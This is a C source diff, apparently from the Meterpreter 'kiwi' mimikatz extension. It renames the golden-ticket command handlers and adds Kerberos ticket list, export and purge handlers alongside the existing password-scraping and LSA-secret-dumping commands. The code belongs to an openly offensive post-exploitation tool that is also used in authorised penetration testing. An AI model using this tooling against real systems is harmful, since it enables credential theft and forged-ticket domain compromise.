@@ -17,15 +17,19 @@ EnableDelayLoadMetSrv();
 #include "mimikatz_interface.h"
 
 DWORD request_scrape_passwords(Remote *remote, Packet *packet);
-DWORD request_golden_ticket_create(Remote *remote, Packet *packet);
-DWORD request_golden_ticket_use(Remote *remote, Packet *packet);
+DWORD request_kerberos_golden_ticket_create(Remote *remote, Packet *packet);
+DWORD request_kerberos_ticket_use(Remote *remote, Packet *packet);
+DWORD request_kerberos_ticket_purge(Remote *remote, Packet *packet);
+DWORD request_kerberos_ticket_list(Remote *remote, Packet *packet);
 DWORD request_lsa_dump_secrets(Remote *remote, Packet *packet);
 
 Command customCommands[] =
 {
     COMMAND_REQ("kiwi_scrape_passwords", request_scrape_passwords),
-    COMMAND_REQ("kiwi_golden_ticket_use", request_golden_ticket_use),
-    COMMAND_REQ("kiwi_golden_ticket_create", request_golden_ticket_create),
+    COMMAND_REQ("kiwi_kerberos_ticket_use", request_kerberos_ticket_use),
+    COMMAND_REQ("kiwi_kerberos_golden_ticket_create", request_kerberos_golden_ticket_create),
+    COMMAND_REQ("kiwi_kerberos_ticket_purge", request_kerberos_ticket_purge),
+    COMMAND_REQ("kiwi_kerberos_ticket_list", request_kerberos_ticket_list),
     COMMAND_REQ("kiwi_lsa_dump_secrets", request_lsa_dump_secrets),
     COMMAND_TERMINATOR
 };
@@ -43,18 +47,18 @@ DWORD request_lsa_dump_secrets(Remote *remote, Packet *packet)
 	return ERROR_SUCCESS;
 }
 
-DWORD request_golden_ticket_use(Remote *remote, Packet *packet)
+DWORD request_kerberos_ticket_use(Remote *remote, Packet *packet)
 {
 	Packet * response = packet_create_response(packet);
 	DWORD result = ERROR_INVALID_PARAMETER;
 	Tlv ticketTlv;
 
-	result = packet_get_tlv(packet, TLV_TYPE_KIWI_GOLD_TICKET, &ticketTlv);
+	result = packet_get_tlv(packet, TLV_TYPE_KIWI_KERB_TKT_RAW, &ticketTlv);
 
 	if (result == ERROR_SUCCESS)
 	{
 		dprintf("[KIWI] Ticket size: %u bytes", ticketTlv.header.length);
-		result = mimikatz_golden_ticket_use(ticketTlv.buffer, ticketTlv.header.length);
+		result = mimikatz_kerberos_ticket_use(ticketTlv.buffer, ticketTlv.header.length);
 	}
 	else
 	{
@@ -66,7 +70,7 @@ DWORD request_golden_ticket_use(Remote *remote, Packet *packet)
 	return result;
 }
 
-DWORD request_golden_ticket_create(Remote *remote, Packet *packet)
+DWORD request_kerberos_golden_ticket_create(Remote *remote, Packet *packet)
 {
 	DWORD result;
 	Packet * response = packet_create_response(packet);
@@ -82,10 +86,34 @@ DWORD request_golden_ticket_create(Remote *remote, Packet *packet)
 	}
 	else
 	{
-		result = mimikatz_golden_ticket_create(user, domain, sid, tgt, response);
+		result = mimikatz_kerberos_golden_ticket_create(user, domain, sid, tgt, response);
 	}
 
 	packet_transmit_response(result, remote, response);
+
+	return ERROR_SUCCESS;
+}
+
+DWORD request_kerberos_ticket_list(Remote *remote, Packet *packet)
+{
+	DWORD result;
+	Packet * response = packet_create_response(packet);
+	BOOL bExport = packet_get_tlv_value_bool(packet, TLV_TYPE_KIWI_KERB_EXPORT);
+
+	result = mimikatz_kerberos_ticket_list(bExport, response);
+
+	packet_transmit_response(result, remote, response);
+
+	return ERROR_SUCCESS;
+}
+
+DWORD request_kerberos_ticket_purge(Remote *remote, Packet *packet)
+{
+	DWORD result = mimikatz_kerberos_ticket_purge();
+
+	dprintf("[KIWI] Purging kerberos tickets (if present)");
+
+	packet_transmit_empty_response(remote, packet, result);
 
 	return ERROR_SUCCESS;
 }
